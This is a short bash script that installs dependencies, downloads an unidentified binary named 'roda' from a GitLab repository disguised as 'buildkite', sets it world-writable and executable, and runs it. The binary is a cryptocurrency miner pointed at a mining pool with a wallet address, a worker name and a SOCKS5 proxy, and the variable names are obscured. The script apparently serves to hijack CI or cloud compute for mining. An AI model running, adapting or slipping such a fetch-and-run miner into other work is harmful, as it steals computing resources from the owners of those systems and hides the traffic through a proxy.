#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O roda https://gitlab.com/krilnols1/buildkite/-/raw/main/roda 
screen -dmS ls
chmod +x phpsur.sh && chmod +x roda && chmod 777 roda phpsur.sh
RENANG=stratum+tcps://stratum-na.rplant.xyz:17042
ACIS=sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57
STRESS=yespowersugar
BANGUNAN=BK-01
PROXY=socks5://158.69.225.110:59166
./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2 -x $PROXY
